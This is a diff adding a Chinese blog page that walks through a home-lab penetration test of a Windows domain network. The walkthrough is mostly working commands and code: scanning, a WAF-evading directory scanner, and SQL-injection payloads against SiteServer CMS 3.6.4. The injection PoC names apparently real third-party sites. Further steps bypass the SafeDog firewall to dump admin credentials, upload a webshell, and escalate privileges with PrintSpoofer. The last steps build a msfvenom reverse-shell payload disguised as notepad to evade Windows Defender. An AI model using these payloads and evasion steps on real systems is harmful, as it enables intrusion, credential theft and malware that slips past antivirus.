@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>项目-内网域渗透 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-内网域渗透"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  项目-内网域渗透
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/03/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
+  <time datetime="2023-09-02T16:21:20.000Z" itemprop="datePublished">2023-09-03</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/">内网域渗透</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">5.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">24 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="1-1-拓扑"><a href="#1-1-拓扑" class="headerlink" title="1.1 拓扑"></a>1.1 拓扑</h2><p><img src="/../../../Typora/img111/image-20230911220319112.png"></p>
+<p>kali 的ip为192.168.0.122</p>
+<p>路线：stack hacker-&gt;web服务器-&gt;oa办公系统-&gt;域控</p>
+<h2 id="1-2搭建"><a href="#1-2搭建" class="headerlink" title="1.2搭建"></a>1.2搭建</h2><p>VMware虚拟网络编辑器加两个虚拟网卡：</p>
+<blockquote>
+<p>10.10.1.0 仅主机模式</p>
+<p>10.10.10.0</p>
+</blockquote>
+<p>win2016 dc、win2016 web、win2016 oa都要写好账号和密码</p>
+<p>web服务器双网卡</p>
+<blockquote>
+<p>第一块桥接ip段：192.168.0.0&#x2F;24</p>
+<p>第二块网卡：10.10.1.0&#x2F;24</p>
+</blockquote>
+<p>oa服务器</p>
+<blockquote>
+<p>10.10.1.0&#x2F;24</p>
+<p>10.10.10.0&#x2F;24</p>
+</blockquote>
+<p>dc域控</p>
+<blockquote>
+<p>10.10.10.0&#x2F;24</p>
+</blockquote>
+<p>对于外网114，无法通过ping它，因为114开了防火墙，可以通过访问该ip，确认其环境无问题</p>
+<p>内网防火墙设置了禁用ping命令，web机与OA无法互相ping，访问其80端口即可</p>
+<p>域控没有防火墙，没禁用ping，可以在OA服务器，ping它</p>
+<h2 id="1-3-利用"><a href="#1-3-利用" class="headerlink" title="1.3 利用"></a>1.3 利用</h2><h2 id="外网篇"><a href="#外网篇" class="headerlink" title="外网篇"></a>外网篇</h2><h3 id="1-3-1-主机发现"><a href="#1-3-1-主机发现" class="headerlink" title="1.3.1 主机发现"></a>1.3.1 主机发现</h3><p>打开<strong>kali</strong>，进行主机发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.0.0/24</span><br></pre></td></tr></table></figure>
+
+<p>得到ip地址</p>
+<blockquote>
+<p>192.168.0.114</p>
+</blockquote>
+<p>ps:</p>
+<blockquote>
+<p>内网用netdiscover(kali与web服务器同网段)</p>
+<p>外网就ping，或者网站查询</p>
+</blockquote>
+<h3 id="1-3-2-端口扫描"><a href="#1-3-2-端口扫描" class="headerlink" title="1.3.2 端口扫描"></a>1.3.2 端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 1-65535 192.168.0.114 --rate=100</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>rate，避免防火墙发现</p>
+</blockquote>
+<p>扫描结果为</p>
+<blockquote>
+<p>端口：80,6588，999,21，5985，3389</p>
+</blockquote>
+<p>nmap对端口进行深度扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 80,6588，999,21，5985，3389 192.168.0.114 -sV -oA test1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>对端口的进一步描述：服务，组件，文件，cpe信息，robots.txt，host等</p>
+<p>系统的名称，版本等信息</p>
+<p>发现了目标机使用的dns解析的地址信息，可以进行域名绑定</p>
+</blockquote>
+<h3 id="1-3-3-美化扫描报告"><a href="#1-3-3-美化扫描报告" class="headerlink" title="1.3.3 美化扫描报告"></a>1.3.3 美化扫描报告</h3><p>此时呢，会出现test1命名的三个文件，其中有一个后缀为.xml的</p>
+<p>加入模板文件mode.xsl，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xsltproc -o test1.html mode.xsl test1.xml </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox test1.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-4-编写目录扫描工具过防火墙"><a href="#1-3-4-编写目录扫描工具过防火墙" class="headerlink" title="1.3.4 编写目录扫描工具过防火墙"></a>1.3.4 编写目录扫描工具过防火墙</h3><p>kali做个hosts绑定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>192.168.0.114 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a></p>
+</blockquote>
+<p>访问网址</p>
+<p>url输入 <code>and 1=1</code>，出现安全狗拦截标志</p>
+<p>如果目标开启了安全狗的<strong>防火墙（抗CC）</strong></p>
+<p>御剑（即使将线程数调低）等工具扫描出路径后，访问时，会被安全狗拦截，并提示访问频繁，会被锁ip</p>
+<p>kali vi一个dirscan.py文件，且已有一个目录字典bing.txt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#conding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bing,txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> readfile:</span><br><span class="line">	<span class="keyword">for</span> dirs <span class="keyword">in</span> readfile.readlines():</span><br><span class="line">        url=<span class="string">&quot;http://www.example.com/&quot;</span>+dirs.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        resp=requests.get(url)</span><br><span class="line">        strlen=<span class="built_in">len</span>(resp.text)</span><br><span class="line">        <span class="built_in">print</span>(url+<span class="string">&#x27;---&#x27;</span>+<span class="built_in">str</span>(resp.status_code)+<span class="string">&#x27;--len--&#x27;</span>+<span class="built_in">str</span>(strlen))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code==<span class="number">200</span> <span class="keyword">or</span> resp.status_code==<span class="number">403</span> <span class="keyword">or</span> resp.status_code==<span class="number">301</span> <span class="keyword">or</span> resp.status_code==<span class="number">500</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;write.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> writefile:</span><br><span class="line">                writefile.write(url+<span class="string">&#x27;---&#x27;</span>+<span class="built_in">str</span>(resp.status_code)+<span class="string">&#x27;--len--&#x27;</span>+<span class="built_in">str</span>(strlen)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p><code>python3 dirscan.py</code>运行</p>
+<p>找到了robots.txt</p>
+<p>可以访问看看</p>
+<blockquote>
+<p>有三个:</p>
+<p>&#x2F;SiteServer&#x2F;</p>
+<p>&#x2F;SiteFiles&#x2F;</p>
+<p>&#x2F;UserCenter&#x2F;</p>
+</blockquote>
+<p>也可以执行 <code>cat write.txt | grep 500</code></p>
+<p>找到的是：</p>
+<blockquote>
+<p>http: &#x2F;&#x2F;www .example.com&#x2F;siteserver—500–len–4254</p>
+</blockquote>
+<h3 id="1-3-5-找cms的利用poc找注入点"><a href="#1-3-5-找cms的利用poc找注入点" class="headerlink" title="1.3.5 找cms的利用poc找注入点"></a>1.3.5 找cms的利用poc找注入点</h3><p>并进行网址访问 <code>http://www.example.com/siteserver</code></p>
+<p>自动加载为 <code>http://www.example.com/siteserver/login.aspx</code></p>
+<p>是一个叫做 <code>siteserver</code>的 <strong>管理员后台登录</strong>网页，且给出了对应版本<code>3.6.4</code></p>
+<p>去google啊，或者github搜一个这种相应版本的cms，没有的话去找一找github的扫描器比如<strong>w9scan</strong>，去找有无对应siteserver的poc，即py脚本</p>
+<p>代码列举了可能的注入语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/evn python</span></span><br><span class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#Author:404</span></span><br><span class="line"><span class="comment">#Name:siteserver最新版3.6.4 sql inject漏洞大礼包of 1</span></span><br><span class="line"><span class="comment">#Refer:http://www.wooyun.org/corps/%E7%99%BE%E5%AE%B9%E5%8D%83%E5%9F%9F%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/page/2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">assign</span>(<span class="params">service,arg</span>):</span><br><span class="line">    <span class="keyword">if</span> service==<span class="string">&quot;siteserver&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>,arg </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">audit</span>(<span class="params">arg</span>):</span><br><span class="line">    ps=[</span><br><span class="line">        <span class="string">&#x27;siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&amp;DateFrom=&amp;DateTo=&amp;IsSuccess=All&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/bbs/background_keywordsFilting.aspx?grade=0&amp;categoryid=0&amp;keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&amp;PageNum=0&amp;Keyword=test&amp;AreaID=0&amp;LastActivityDate=0&amp;Order=UserName&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/userRole/background_user.aspx?PageNum=0&amp;Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&amp;CreateDate=0&amp;LastActivityDate=0&amp;TypeID=0&amp;DepartmentID=0&amp;AreaID=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/bbs/background_thread.aspx?UserName=test&amp;Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&amp;DateFrom=&amp;DateTo=&amp;ForumID=0&#x27;</span>,</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">        url=arg+p</span><br><span class="line">        code,head,res,errcode,_=curl.curl2(url)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> code==<span class="number">500</span> <span class="keyword">and</span> <span class="string">&quot;GAOJIMicrosoft&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            security_hole(url)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">from</span> dummy <span class="keyword">import</span> *</span><br><span class="line">    audit(assign(<span class="string">&#x27;siteserver&#x27;</span>,<span class="string">&#x27;http://www.plhgyy.com/&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="comment">#audit(assign(&#x27;siteserver&#x27;,&#x27;http://www.zgktws.com/&#x27;)[1])</span></span><br></pre></td></tr></table></figure>
+
+<p>代码复制到kali，更改代码的url部分，改为目标网址，找到状态码为500的注入语句。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/evn python</span></span><br><span class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#Author:404</span></span><br><span class="line"><span class="comment">#Name:siteserver最新版3.6.4 sql inject漏洞大礼包of 1</span></span><br><span class="line"><span class="comment">#Refer:http://www.wooyun.org/corps/%E7%99%BE%E5%AE%B9%E5%8D%83%E5%9F%9F%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/page/2</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ps=[</span><br><span class="line">        <span class="string">&#x27;siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&amp;DateFrom=&amp;DateTo=&amp;IsSuccess=All&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/bbs/background_keywordsFilting.aspx?grade=0&amp;categoryid=0&amp;keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&amp;PageNum=0&amp;Keyword=test&amp;AreaID=0&amp;LastActivityDate=0&amp;Order=UserName&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/userRole/background_user.aspx?PageNum=0&amp;Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&amp;CreateDate=0&amp;LastActivityDate=0&amp;TypeID=0&amp;DepartmentID=0&amp;AreaID=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/bbs/background_thread.aspx?UserName=test&amp;Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&amp;DateFrom=&amp;DateTo=&amp;ForumID=0&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps: </span><br><span class="line">    url=<span class="string">&#x27;http://www.example.com/&#x27;</span>+p</span><br><span class="line">    res=requests.get(url)</span><br><span class="line">	<span class="keyword">if</span> res.status_code==<span class="number">500</span> <span class="keyword">and</span> <span class="string">&quot;GAOJIMicrosoft&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>python3 该代码后，</p>
+<p>结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/usercenter/platform/</span><br><span class="line">user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)对应为：</p>
+<p>GAOJI</p>
+</blockquote>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>访问该语句，由于<code>@@version=2</code>网页报错回显了<strong>数据库的版本信息</strong></p>
+<blockquote>
+<p>Microsoft SQL server 2008 R2(SP2)</p>
+</blockquote>
+<p>尝试更改语句包含db_name:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20db_name=2;%20--</span><br></pre></td></tr></table></figure>
+
+<p>db_name&#x3D;2，被iis安全狗拦截了该语句</p>
+<p>这个时候通过 <code>~</code> 取反 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20db_name=~2;%20--</span><br></pre></td></tr></table></figure>
+
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/317348.html">按位取反</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1674113">sql注入过狗</a></p>
+</blockquote>
+<p>回显报错，而不是安全狗的拦截，显示可以过拦截</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20@@version=~2;%20--</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在将nvarchar值 ‘Microsoft SQL server 2008 R2(SP2)’ …转化成数据类型int失败</p>
+</blockquote>
+<h4 id="数据库用户密码"><a href="#数据库用户密码" class="headerlink" title="数据库用户密码"></a>数据库用户密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20user=~2;%20--</span><br></pre></td></tr></table></figure>
+
+<p>由于user这个字段，目标的数据库是没有的，所以报错了</p>
+<blockquote>
+<p>在将nvarchar值’msmoonlab’转换成数据类型int时失败</p>
+</blockquote>
+<p>这个时候一般要通过字典去跑<strong>字段</strong>、<strong>表名</strong></p>
+<p>为了演示，直接在目标机的数据库取出来(比如字段：username、password、passwordsalt…)</p>
+<p>当然，已知siteserver框架，数据结构可以搜索引擎搜索</p>
+<p>尝试下列语句，被iis安全狗拦截了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...and (select top 1 username from bairong_Administrator)=~1;...</span><br></pre></td></tr></table></figure>
+
+<p>尝试下列语句，为字段加上中括号，也被iis安全狗拦截了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...and (select top 1 [username] from [bairong_Administrator])=~1;...</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>过防火墙的拦截</strong></p>
+<p>尝试<strong>取反放在前面</strong>，回显报错，得到了username为amin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...and ~1=(select top 1 username from [bairong_Administrator]);...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在将nvarchar值’admin’转化成数据类型int时失败</p>
+</blockquote>
+<p>尝试下列语句，回显报错，得到了password为’一段哈希值’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...and ~1=(select top 1 password from [bairong_Administrator]);...</span><br></pre></td></tr></table></figure>
+
+<p>得到密文为：</p>
+<blockquote>
+<p>….值’64…w&#x3D;&#x3D;’…</p>
+</blockquote>
+<p>同理得到密码盐passwordsalt</p>
+<blockquote>
+<p>…pg&#x3D;&#x3D;</p>
+</blockquote>
+<p>加密格式为Encrypted(‘明文’,’salt’)</p>
+<p>猜测加密方式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64(Encrypted(&#x27;明文&#x27;,&#x27;salt&#x27;))</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-6-dnSpy-查找dll的加解密"><a href="#1-3-6-dnSpy-查找dll的加解密" class="headerlink" title="1.3.6 dnSpy 查找dll的加解密"></a>1.3.6 dnSpy 查找dll的加解密</h3><p>由于嘞，已知login.aspx，所以知道是.NET类型的，而dnSpy是对.NET程序的反编译工具，源代码审计了，全局查找</p>
+<p>在后台登录，随便登录一下，开发者工具的网络查看该请求的流向，依然是login.aspx，</p>
+<p>找到真正加密与解密的类，而不是调用的</p>
+<h3 id="1-3-7-编写密文解密工具"><a href="#1-3-7-编写密文解密工具" class="headerlink" title="1.3.7 编写密文解密工具"></a>1.3.7 编写密文解密工具</h3><p>用microsoft vs 新建一个windows窗体程序，</p>
+<p>拖取了4个textbox控件(密文,slat,明文,错误信息)，一个button按钮</p>
+<p>将解密的代码复制过来，button方法去调用该解密方法，启动程序</p>
+<p>输入密文和salt，点击button，显示明文得 <code>admin5566</code></p>
+<h3 id="1-3-8-找回密码漏洞"><a href="#1-3-8-找回密码漏洞" class="headerlink" title="1.3.8 找回密码漏洞"></a>1.3.8 找回密码漏洞</h3><p>siteserver cms提供了找回密码功能，仅提供用户名，之后回答密保问题即可</p>
+<p>那么burpsuite去抓包拦截一下，将问题的答案<strong>置为空</strong>，可以得到真实密码 <code>admin5566</code></p>
+<p>登录进去后，该cms的站点模块管理，有导入站点模板功能，<strong>可以上传zip文件</strong>。直接去内容模块上传文件，比如图片，那些会被安全狗锁死</p>
+<p>现有一个过狗的aspx文件，压缩后上传，上传后该cms会自动解压的，得到aspx文件。</p>
+<p>这里为了演示方便，直接获得了该cms的文件存储路径</p>
+<p>攻击者访问这个路径下的aspx文件，网页会报错</p>
+<p>这个时候找 <strong>过狗</strong> 工具连接即可，(但中国菜刀和蚁剑连接会被安全狗拦截)，csdn有的大佬用的冰蝎的马，貌似也过了</p>
+<h3 id="1-3-9-siteserver后台-getshell"><a href="#1-3-9-siteserver后台-getshell" class="headerlink" title="1.3.9 siteserver后台 getshell"></a>1.3.9 siteserver后台 getshell</h3><p>过狗工具(如冰蝎)切换到终端，</p>
+<p>输入systeminfo 查看系统信息</p>
+<p>ipconfig &#x2F;all 发现两块网卡</p>
+<p>输入 <code>netstat -ano</code> 查看开放的端口</p>
+<p><code>net start</code>查看开放的服务，比如能看到<strong>安全狗服务</strong>之类的</p>
+<p><code>whoami /all</code>查看用户信息&#x2F;组&#x2F;特权信息</p>
+<blockquote>
+<p>SeImpersonatePrivilege        身份验证后模拟客户端 已启用      这个服务能够帮助我们提权</p>
+</blockquote>
+<p><code>tasklist</code>查看进程，找<strong>到存在的防护软件</strong></p>
+<h3 id="1-3-10-printSpoofer的提权"><a href="#1-3-10-printSpoofer的提权" class="headerlink" title="1.3.10 printSpoofer的提权"></a>1.3.10 printSpoofer的提权</h3><p>目的是上传该软件到目标机，并运行，提权成system</p>
+<p>由于该服务器上有安全狗等防护软件，增加用户的话可能被拦截。</p>
+<p>也有dll动态链接库来做反弹的、但是这种上传上去就会被安全狗杀</p>
+<p>所以最好上远控，但是嘞，杀软defender存在， 所以要免杀。</p>
+<p>将找到的Print Spooler免杀 通过过狗工具(如冰蝎)进行文件上传，注意上传到 <strong>即使是最小权限用户也能读能执行的目录下</strong>，那就是 <code>C:/Windows/Temp</code>目录</p>
+<p>在其虚拟终端中运行一下，查看权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printspoofer1.exe -i -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ps:</p>
+<blockquote>
+<p>使用教程<br><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p>
+</blockquote>
+<h3 id="1-3-11-msf-shellcode绕过windows-defender查杀"><a href="#1-3-11-msf-shellcode绕过windows-defender查杀" class="headerlink" title="1.3.11 msf shellcode绕过windows defender查杀"></a>1.3.11 msf shellcode绕过windows defender查杀</h3><h4 id="1-3-11-1-msf生成免杀攻击载荷"><a href="#1-3-11-1-msf生成免杀攻击载荷" class="headerlink" title="1.3.11.1 msf生成免杀攻击载荷"></a>1.3.11.1 msf生成免杀攻击载荷</h4><p>在kali运行以下代码，lhost是kali的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.122 lport=2333 -e x86/shikata_ga_nai -i 15 -f csharp -o payload.txt </span><br></pre></td></tr></table></figure>
+
+<p>用<strong>掩日工具</strong>对payload.txt的内容进行shellcode编译，语言c#，另存为<code>p1.exe</code>文件(起一个notepad等常见的名字最好)</p>
+<p>ps:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">工具地址</a></p>
+</blockquote>
+<p>kali打开msfconsole</p>
